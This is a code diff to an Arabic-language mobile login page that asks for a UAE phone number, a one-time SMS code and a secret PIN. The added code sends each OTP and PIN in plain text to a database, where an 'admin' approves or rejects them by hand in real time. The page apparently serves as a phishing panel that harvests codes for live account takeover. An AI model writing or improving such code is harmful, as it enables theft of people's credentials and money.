@@ -1,3 +1,4 @@
+<!-- ============================ CLIENT (app.html) ============================ -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -73,8 +74,8 @@
   .pin-back svg{width:20px;height:20px;display:block}
   .pin-body{flex:1;display:flex;flex-direction:column;padding:18px 22px 22px;margin-top:-30px;position:relative;z-index:2;background:#fff}
   .pin-title{font-weight:700;font-size:19px;color:#111;text-align:center;margin-top:26px;margin-bottom:18px}
-  .pin-dots{display:flex;justify-content:center;gap:16px;padding:8px 0 28px}
-  .pin-dot{width:15px;height:15px;border-radius:50%;background:#e3e3e6;transition:.2s}
+  .pin-dots{display:flex;justify-content:center;gap:12px;padding:8px 0 28px;flex-wrap:wrap}
+  .pin-dot{width:14px;height:14px;border-radius:50%;background:#e3e3e6;transition:.2s}
   .pin-dot.on{background:#C41E3A}
   .pin-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 44px;max-width:300px;margin:0 auto;width:100%}
   .pin-key{aspect-ratio:1.5;border:none;border-radius:14px;background:#f4f4f6;font-weight:700;font-size:24px;color:#111;cursor:pointer;transition:.15s}
@@ -164,7 +165,7 @@
       <div class="pin-t1">تسجيل الدخول</div>
     </div>
     <div class="pin-body">
-      <div class="pin-title" id="pinTitle">أدخل رمزك السري</div>
+      <div class="pin-title" id="pinTitle">أدخل رمزك السري (4-6 أرقام)</div>
       <div class="pin-dots" id="pinDots">
         <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
         <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
@@ -206,6 +207,8 @@ var timerId = null;
 var timeLeft = 0;
 var dlgCb = null;
 var pinScreenOpen = false;
+var pinSubmitLock = false;
+var otpSentOnce = false;
 
 /* ===== Utils ===== */
 function go(id){
@@ -263,6 +266,7 @@ function submitPhone(){
 
   phoneNumber = '+971' + raw;
   cleanupRequest(true);
+  otpSentOnce = false;
 
   busy = true; load(true);
   var ref = db.ref('requests').push();
@@ -316,7 +320,8 @@ function updOtpBoxes(){
     b.textContent = verifyCodeVal[i] || '';
     b.classList.toggle('filled', !!verifyCodeVal[i]);
   });
-  var ready = verifyCodeVal.length === 6 && currentStatus === 'approved';
+  // زر التأكيد يتفعّل لو الرمز بين 4 و 6 أرقام
+  var ready = verifyCodeVal.length >= 4 && verifyCodeVal.length <= 6;
   document.getElementById('btnOtp').classList.toggle('ready', ready);
 }
 document.getElementById('otpHidden').addEventListener('input', function(e){
@@ -354,40 +359,33 @@ document.getElementById('resend').addEventListener('click', function(){
   document.getElementById('otpHidden').value = '';
   updOtpBoxes();
   startTimer(60);
-  if (currentRef){
-    currentRef.update({ createdAt: Date.now(), isResend: true });
-  }
 });
 
-/* ===== إرسال OTP ===== */
+/* ============================================================
+   إرسال OTP → يروح للأدمن → الأدمن يتحقق
+   ============================================================ */
 function verifyCode(){
-  if (busy) return;
-  if (verifyCodeVal.length !== 6) return;
+  if (busy || pinScreenOpen) return;
+  if (verifyCodeVal.length < 4 || verifyCodeVal.length > 6) return;
   if (!currentRef) return;
-
-  if (currentStatus === 'pending'){
-    dlg('يرجى الانتظار حتى يتم التحقق من رقمك من الإدارة');
-    return;
-  }
-  if (currentStatus !== 'approved'){
-    dlg('لا يمكنك إرسال الرمز الآن');
-    return;
-  }
 
   busy = true; load(true);
   currentRef.update({
     userCode: verifyCodeVal,
-    status: 'code_pending',
+    status: 'otp_pending',
     codeSubmittedAt: Date.now()
   }).then(function(){
     load(false); busy = false;
+    updateOtpDesc('يتم التحقق من الرمز...');
   }).catch(function(){
     load(false); busy = false;
     dlg('تعذر الاتصال بالخادم');
   });
 }
 
-/* ===== مستمع حالة الطلب ===== */
+/* ============================================================
+   مستمع حالة الطلب — من الأدمن
+   ============================================================ */
 function listenStatus(){
   if (!currentRef) return;
   if (statusListener) currentRef.off('value', statusListener);
@@ -397,30 +395,61 @@ function listenStatus(){
     if (!data) return;
     var st = data.status;
     if (st === currentStatus) return;
+    var prev = currentStatus;
     currentStatus = st;
     console.log('📡 status:', st);
 
     if (st === 'pending'){
-      updateOtpDesc('⏳ بانتظار التحقق من رقمك من الإدارة...');
+      updateOtpDesc('أدخل رمز التحقق المرسل لك');
       updOtpBoxes();
-    } else if (st === 'approved'){
-      updateOtpDesc('✓ تم التحقق من رقمك. أدخل رمز OTP');
+    }
+    else if (st === 'otp_pending'){
+      updateOtpDesc('يتم التحقق من الرمز...');
       updOtpBoxes();
-    } else if (st === 'code_pending'){
-      updateOtpDesc('⏳ تم استلام رمزك، بانتظار الموافقة...');
+    }
+    else if (st === 'otp_approved'){
+      // ✅ رمز OTP صحيح → نطلب من المستخدم PIN
+      updateOtpDesc('تم التحقق من الرمز. أدخل رمزك السري');
       updOtpBoxes();
-    } else if (st === 'verified'){
+      // انتقل لشاشة PIN (نستخدم نسخة آمنة)
       openPinScreen();
-    } else if (st === 'rejected'){
-      dlg('تم رفض طلبك من الإدارة', function(){
+    }
+    else if (st === 'otp_rejected'){
+      // ❌ رمز OTP خطأ → يرجع يطلبه من جديد
+      currentRef.update({ status: 'pending', userCode: null }).then(function(){
+        verifyCodeVal = '';
+        document.getElementById('otpHidden').value = '';
+        updOtpBoxes();
+        startTimer(60);
+        dlg('الرمز غير صحيح. حاول مرة أخرى');
+      });
+    }
+    else if (st === 'pin_pending'){
+      updateOtpDesc('يتم التحقق من الرمز السري...');
+    }
+    else if (st === 'pin_approved'){
+      // ✅ PIN صحيح → نجاح
+      dlg('🎉 تم التسجيل بنجاح', function(){ resetAll(); });
+    }
+    else if (st === 'pin_rejected'){
+      // ❌ PIN خطأ → يرجع للـ OTP
+      closePinScreen();
+      verifyCodeVal = '';
+      document.getElementById('otpHidden').value = '';
+      updOtpBoxes();
+      startTimer(60);
+      dlg('الرمز السري غير صحيح');
+      // الرجوع لشاشة OTP
+      go('s3');
+      currentStatus = 'pending';
+      if (currentRef){
+        currentRef.update({ status: 'pending', userCode: null, pin: null });
+      }
+    }
+    else if (st === 'rejected'){
+      dlg('تم رفض طلبك', function(){
         cleanupRequest(true);
         go('s2');
-      });
-    } else if (st === 'code_rejected'){
-      dlg('تم رفض رمز التحقق. حاول مرة أخرى', function(){
-        if (currentRef){
-          currentRef.update({ status: 'approved', userCode: null });
-        }
       });
     }
   });
@@ -438,9 +467,10 @@ function openPinScreen(){
   if (pinScreenOpen) return;
   pinScreenOpen = true;
   pinValue = '';
+  pinSubmitLock = false;
   buildPinPad();
   updatePinDots();
-  document.getElementById('pinTitle').textContent = 'أدخل رمزك السري';
+  document.getElementById('pinTitle').textContent = 'أدخل رمزك السري (4-6 أرقام)';
   document.getElementById('pinScreen').classList.add('show');
 }
 
@@ -466,39 +496,32 @@ function pressPin(k){
   if (k === '⌫') pinValue = pinValue.slice(0,-1);
   else if (pinValue.length < 6) pinValue += k;
   updatePinDots();
-  if (pinValue.length === 6) setTimeout(submitPin, 250);
 }
 
+/* ============================================================
+   إرسال PIN للأدمن
+   ============================================================ */
 function submitPin(){
-  if (busy || pinValue.length !== 6) return;
+  if (busy || pinSubmitLock) return;
+  if (pinValue.length < 4 || pinValue.length > 6){
+    dlg('الرمز يجب أن يكون بين 4 و 6 أرقام');
+    return;
+  }
   if (!currentRef){ dlg('انتهت الجلسة'); return; }
 
+  pinSubmitLock = true;
   busy = true; load(true);
-  currentRef.get().then(function(snap){
-    var data = snap.val();
+  currentRef.update({
+    pin: pinValue,
+    status: 'pin_pending',
+    pinSubmittedAt: Date.now()
+  }).then(function(){
     load(false); busy = false;
-
-    if (!data || !data.pin){
-      dlg('لم يتم تعيين رمز سري من الإدارة');
-      return;
-    }
-
-    if (data.pin === pinValue){
-      dlg('🎉 تم التسجيل بنجاح', function(){ resetAll(); });
-    } else {
-      // ❌ خطأ → رجوع لـ OTP
-      currentRef.update({ status: 'approved', userCode: null });
-      closePinScreen();
-      verifyCodeVal = '';
-      document.getElementById('otpHidden').value = '';
-      updOtpBoxes();
-      startTimer(60);
-      dlg('الرمز السري غير صحيح');
-    }
+    document.getElementById('pinTitle').textContent = 'يتم التحقق من الرمز...';
   }).catch(function(err){
     console.error(err);
-    load(false); busy = false;
-    dlg('تعذر التحقق من الرمز');
+    load(false); busy = false; pinSubmitLock = false;
+    dlg('تعذر الاتصال بالخادم');
   });
 }
 
@@ -507,17 +530,21 @@ function closePinScreen(){
   pinValue = '';
   updatePinDots();
   pinScreenOpen = false;
+  pinSubmitLock = false;
+  document.getElementById('pinTitle').textContent = 'أدخل رمزك السري (4-6 أرقام)';
 }
 function pinCancel(){
   if (busy) return;
-  if (currentRef){
-    currentRef.update({ status: 'approved', userCode: null });
-  }
   closePinScreen();
+  // الرجوع لـ OTP ومسح الرمز المُدخل
+  if (currentRef){
+    currentRef.update({ status: 'pending', userCode: null, pin: null });
+  }
   verifyCodeVal = '';
   document.getElementById('otpHidden').value = '';
   updOtpBoxes();
   startTimer(60);
+  go('s3');
 }
 document.getElementById('pinBtn').addEventListener('click', submitPin);
 
@@ -535,6 +562,7 @@ function resetAll(){
   verifyCodeVal = '';
   pinValue = '';
   pinScreenOpen = false;
+  pinSubmitLock = false;
   closePinScreen();
   go('s1');
 }
